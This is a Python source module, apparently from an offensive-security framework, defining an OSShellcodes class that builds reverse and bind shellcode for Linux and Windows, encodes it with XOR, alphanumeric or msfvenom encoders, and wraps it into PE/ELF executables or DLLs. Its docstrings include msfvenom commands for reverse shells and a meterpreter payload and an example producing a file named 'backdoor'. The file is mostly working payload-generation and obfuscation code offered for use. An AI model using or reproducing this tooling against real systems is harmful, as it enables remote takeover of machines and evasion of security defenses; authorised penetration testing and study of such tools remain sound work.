"""
Binary shellcode generation module for offensive operations.

Provides:
- Template-based shellcode generation for Linux/Windows x86/x64
- Custom template support for user-defined shellcode
- msfvenom integration for loading external shellcode
- Encoding support (XOR, alphanum)
- Executable generation (PE/ELF)
- Bad character detection and avoidance

Example:
    >>> from ofx.api.shellcode import OSShellcodes
    >>>
    >>> # Generate Linux x64 reverse shell
    >>> sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
    >>> payload = sc.create_shellcode(shellcode_type="reverse")
    >>>
    >>> # Or load from msfvenom
    >>> sc = OSShellcodes.from_msfvenom(msfvenom_bytes, "linux", "x64")
    >>> payload = sc.create_shellcode(encode="xor", make_exe=1)
"""

import ast
import logging
from pathlib import Path
from typing import Callable

from ofx.settings import settings

from .base import ShellCode
from .encoder import encode_alphanum, encode_xor, remove_bad_chars
from .exe import ShellcodeToExe
from .generator import ShellGenerator

logger = logging.getLogger(settings.app_branding)

__all__ = [
    "OSShellcodes",
    "ShellCode",
    "ShellcodeToExe",
    "ShellGenerator",
]


class OSShellcodes:
    """Main interface for shellcode generation"""

    def __init__(
        self,
        os_target: str,
        os_target_arch: str,
        connect_back_ip: str = "localhost",
        connect_back_port: int = 5555,
        bad_chars: list[str] | None = None,
        custom_shellcode: bytes | str | None = None,
    ):
        """
        Initialize shellcode generator.

        Args:
            os_target: Target OS (linux, windows)
            os_target_arch: Target architecture (x86, x64)
            connect_back_ip: IP address for reverse shell
            connect_back_port: Port for reverse/bind shell
            bad_chars: List of bad characters to avoid (e.g., ["\\x00", "\\x0a"])
            custom_shellcode: Pre-generated shellcode bytes or string

        Example:
            >>> # Generate from template
            >>> sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
            >>> payload = sc.create_shellcode(shellcode_type="reverse")
            >>>
            >>> # Use custom shellcode
            >>> sc = OSShellcodes("linux", "x64", custom_shellcode=b"\\x90\\x90\\x90")
            >>> payload = sc.create_shellcode()
        """
        self.name = ""
        self.OS_TARGET = os_target.upper()
        self.OS_TARGET_ARCH = os_target_arch
        self.CONNECTBACK_IP = connect_back_ip
        self.CONNECTBACK_PORT = connect_back_port
        self.BADCHARS = bad_chars or ["\\x00"]
        self.binary_path = ""
        self.custom_shellcode = (
            self._parse_shellcode_input(custom_shellcode) if custom_shellcode else None
        )

    def _parse_shellcode_input(self, shellcode_input: bytes | str) -> bytes:
        """
        Parse shellcode from various formats.

        Supports:
        - Raw bytes: b"\\xfc\\x48\\x83..."
        - Hex string: "fc4883e4f0..."
        - C-style: "\\xfc\\x48\\x83..."
        - Python literal: b"\\xfc\\x48\\x83..."

        Args:
            shellcode_input: Shellcode in various formats

        Returns:
            Raw shellcode bytes
        """
        if isinstance(shellcode_input, bytes):
            return shellcode_input

        if not isinstance(shellcode_input, str):
            raise ValueError(
                f"Shellcode input must be bytes or str, got {type(shellcode_input)}"
            )

        shellcode_str: str = shellcode_input.strip()

        # C-style format: "\\xfc\\x48\\x83..."
        if "\\x" in shellcode_str:
            shellcode_str = shellcode_str.replace('"', "").replace("'", "")
            shellcode_str = (
                shellcode_str.replace(" ", "").replace("\\n", "").replace("\\r", "")
            )
            hex_values = shellcode_str.split("\\x")[1:]
            return bytes([int(h[:2], 16) for h in hex_values if h])

        # Raw hex string: "fc4883e4f0e8..."
        elif all(c in "0123456789abcdefABCDEF" for c in shellcode_str.replace(" ", "")):
            shellcode_str = shellcode_str.replace(" ", "")
            return bytes.fromhex(shellcode_str)

        # Python byte literal: b"\\xfc\\x48..."
        elif shellcode_str.startswith('b"') or shellcode_str.startswith("b'"):
            return ast.literal_eval(shellcode_str)

        else:
            raise ValueError(f"Unknown shellcode format: {shellcode_str[:50]}...")

    def create_shellcode(
        self,
        shellcode_type: str = "reverse",
        command: str = "calc.exe",
        message: str = "",
        encode: str | None = None,
        encode_key: int = 0xAA,
        make_exe: int = 0,
        debug: int = 0,
        filename: str = "",
        dll_inj_funcs: list[str] | None = None,
        shell_args: dict | None = None,
        use_precompiled: bool = True,
        use_msfvenom: bool = False,
        use_docker_compile: bool = False,
        msfvenom_encoder: str | None = None,
        msfvenom_iterations: int = 1,
    ) -> bytes:
        """
        Create shellcode with optional encoding and executable generation.

        Args:
            shellcode_type: Type of shellcode (reverse, bind, custom)
            command: Command to execute (for certain shellcode types)
            message: Message payload (for certain shellcode types)
            encode: Encoding type ("xor", "alphanum", None)
            encode_key: Key for XOR encoding (0x00-0xFF)
            make_exe: Create executable file (1) or return raw bytes (0)
            debug: Enable debug logging (1) or not (0)
            filename: Output filename for executable
            dll_inj_funcs: DLL injection functions (Windows)
            shell_args: Additional arguments
            use_precompiled: Use precompiled shellcode if available
            use_msfvenom: Force msfvenom usage (requires msfvenom CLI)
            use_docker_compile: Force Docker assembly compilation
            msfvenom_encoder: Msfvenom encoder (e.g., "x86/shikata_ga_nai")
            msfvenom_iterations: Encoding iterations (default: 1)

        Returns:
            Raw shellcode bytes

        Example:
            >>> sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
            >>> # Use msfvenom explicitly
            >>> payload = sc.create_shellcode(use_msfvenom=True)
            >>>
            >>> # Use Docker assembly compilation
            >>> payload = sc.create_shellcode(use_docker_compile=True)
        """
        dll_inj_funcs = dll_inj_funcs or []
        shell_args = shell_args or {}

        # Force Docker assembly compilation if requested
        if use_docker_compile:
            from .assembler import get_assembly_compiler

            compiler = get_assembly_compiler()
            shellcode = compiler.compile(
                self.OS_TARGET.lower(),
                self.OS_TARGET_ARCH,
                shellcode_type,
                self.CONNECTBACK_IP,
                self.CONNECTBACK_PORT,
            )
            self.binary_path = ""
            if debug:
                logger.debug(f"Docker assembly: {len(shellcode)} bytes")

        # Force msfvenom if requested
        elif use_msfvenom:
            from .msfvenom import get_msfvenom_generator

            generator = get_msfvenom_generator()
            shellcode = generator.generate(
                self.OS_TARGET.lower(),
                self.OS_TARGET_ARCH,
                shellcode_type,
                self.CONNECTBACK_IP,
                self.CONNECTBACK_PORT,
                bad_chars=self.BADCHARS if self.BADCHARS != ["\\x00"] else None,
                encoder=msfvenom_encoder,
                iterations=msfvenom_iterations,
                format="raw",
            )
            self.binary_path = ""
            if debug:
                logger.debug(f"Msfvenom: {len(shellcode)} bytes")

        # Use custom shellcode if provided
        elif self.custom_shellcode:
            shellcode = self.custom_shellcode
            self.binary_path = ""
            if debug:
                logger.debug(f"Custom: {len(shellcode)} bytes")

        # Generate from template (auto tries msfvenom, falls back to Docker)
        else:
            generator = ShellGenerator(self.OS_TARGET, self.OS_TARGET_ARCH)
            shellcode, self.binary_path = generator.get_shellcode(
                shellcode_type,
                connectback_ip=self.CONNECTBACK_IP,
                connectback_port=self.CONNECTBACK_PORT,
                make_exe=make_exe,
                debug=debug,
                filename=filename,
                dll_inj_funcs=dll_inj_funcs,
                shell_args=shell_args,
                use_precompiled=use_precompiled,
            )

        # Apply encoding if requested
        if encode:
            if encode.lower() == "xor":
                logger.info(f"Encoding with XOR key: 0x{encode_key:02x}")
                shellcode = encode_xor(shellcode, encode_key)
            elif encode.lower() == "alphanum":
                logger.info("Encoding with alphanumeric encoder")
                shellcode = encode_alphanum(shellcode)
            else:
                logger.warning(f"Unknown encoding type: {encode}")

        # Check for bad characters
        if self.BADCHARS:
            shellcode, has_bad = remove_bad_chars(shellcode, self.BADCHARS)
            if has_bad and debug:
                logger.warning("Bad characters detected in shellcode!")

        # Create executable if requested and not already created
        if make_exe and not self.binary_path:
            exe_gen = ShellcodeToExe(
                shellcode,
                self.OS_TARGET,
                self.OS_TARGET_ARCH,
                filename=filename or "custom_payload",
                dll_inj_funcs=dll_inj_funcs,
            )
            self.binary_path = exe_gen.create_executable()
            if debug:
                logger.debug(f"Created executable: {self.binary_path}")

        return shellcode

    def get_exe_path(self) -> str | None:
        """
        Get path to generated executable.

        Returns:
            Path to .exe file or None if not generated
        """
        if Path(self.binary_path + ".exe").exists():
            return str(Path(self.binary_path + ".exe").resolve())
        return None

    def get_dll_path(self) -> str | None:
        """
        Get path to generated DLL.

        Returns:
            Path to .dll file or None if not generated
        """
        if Path(self.binary_path + ".dll").exists():
            return str(Path(self.binary_path + ".dll").resolve())
        return None

    @classmethod
    def from_msfvenom(
        cls,
        shellcode: bytes | str,
        os_target: str = "linux",
        os_target_arch: str = "x64",
        bad_chars: list[str] | None = None,
    ) -> "OSShellcodes":
        """
        Create OSShellcodes instance from msfvenom output.

        Args:
            shellcode: Msfvenom output (bytes, hex, or C-style)
            os_target: Target OS
            os_target_arch: Target architecture
            bad_chars: List of bad characters

        Returns:
            OSShellcodes instance with custom shellcode

        Example:
            >>> # Generate with msfvenom:
            >>> # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python
            >>> shellcode = b"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f..."
            >>> sc = OSShellcodes.from_msfvenom(shellcode, "linux", "x64")
            >>> payload = sc.create_shellcode(encode="xor", make_exe=1)
        """
        return cls(
            os_target=os_target,
            os_target_arch=os_target_arch,
            connect_back_ip="",
            connect_back_port=0,
            bad_chars=bad_chars,
            custom_shellcode=shellcode,
        )

    @classmethod
    def from_file(
        cls,
        filepath: str | Path,
        os_target: str = "linux",
        os_target_arch: str = "x64",
        bad_chars: list[str] | None = None,
    ) -> "OSShellcodes":
        """
        Load shellcode from file.

        Args:
            filepath: Path to shellcode file
            os_target: Target OS
            os_target_arch: Target architecture
            bad_chars: List of bad characters

        Returns:
            OSShellcodes instance with shellcode from file

        Example:
            >>> # Generate with msfvenom to file:
            >>> # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f raw -o payload.bin
            >>> sc = OSShellcodes.from_file("payload.bin", "windows", "x64")
            >>> sc.create_shellcode(make_exe=1, filename="backdoor")
        """
        filepath = Path(filepath)
        if not filepath.exists():
            raise FileNotFoundError(f"Shellcode file not found: {filepath}")

        shellcode = filepath.read_bytes()
        return cls(
            os_target=os_target,
            os_target_arch=os_target_arch,
            connect_back_ip="",
            connect_back_port=0,
            bad_chars=bad_chars,
            custom_shellcode=shellcode,
        )

    @classmethod
    def register_custom_template(
        cls,
        os_target: str,
        os_target_arch: str,
        shellcode_type: str,
        template: Callable[[str, int], bytes] | bytes,
    ) -> None:
        """
        Register a custom shellcode template.

        Args:
            os_target: Target OS (e.g., "linux", "windows")
            os_target_arch: Target architecture (e.g., "x86", "x64")
            shellcode_type: Type of shellcode (e.g., "reverse", "bind", "custom")
            template: Either raw bytes or a callable that takes (ip, port) and returns bytes

        Example:
            >>> import struct
            >>>
            >>> def my_custom_shell(ip: str, port: int) -> bytes:
            ...     ip_bytes = bytes(map(int, ip.split(".")))
            ...     port_bytes = struct.pack(">H", port)
            ...     return b"\\x90" * 10 + ip_bytes + port_bytes
            >>>
            >>> OSShellcodes.register_custom_template("linux", "x64", "custom", my_custom_shell)
            >>>
            >>> sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
            >>> payload = sc.create_shellcode(shellcode_type="custom")
        """
        ShellGenerator.register_template(
            os_target, os_target_arch, shellcode_type, template
        )

    @classmethod
    def unregister_custom_template(
        cls, os_target: str, os_target_arch: str, shellcode_type: str
    ) -> None:
        """
        Unregister a custom shellcode template.

        Args:
            os_target: Target OS
            os_target_arch: Target architecture
            shellcode_type: Type of shellcode
        """
        ShellGenerator.unregister_template(os_target, os_target_arch, shellcode_type)

    @classmethod
    def clear_custom_templates(cls) -> None:
        """Clear all custom templates"""
        ShellGenerator.clear_templates()

    @classmethod
    def list_custom_templates(cls) -> list[str]:
        """
        List all registered custom templates.

        Returns:
            List of template keys (e.g., ["LINUX_X64_custom"])
        """
        return ShellGenerator.list_templates()
